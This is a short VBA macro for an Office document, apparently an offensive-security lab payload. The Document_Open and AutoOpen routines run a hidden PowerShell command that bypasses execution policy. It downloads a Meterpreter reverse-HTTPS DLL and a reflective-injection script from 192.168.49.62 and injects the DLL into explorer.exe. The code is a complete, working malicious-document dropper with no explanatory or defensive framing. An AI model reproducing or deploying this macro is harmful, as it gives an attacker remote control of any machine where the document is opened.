```vb
Sub MyMacro()
    Dim str As String
    str = "powershell -ep bypass -Command $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.62/met_revhttps_443_x64.dll');$procid = (Get-Process -Name explorer).Id;(New-Object System.Net.WebClient).DownloadString('http://192.168.49.62/Invoke-ReflectivePEInjection.ps1') | iex ;Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
    Shell str, vbHide
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub

```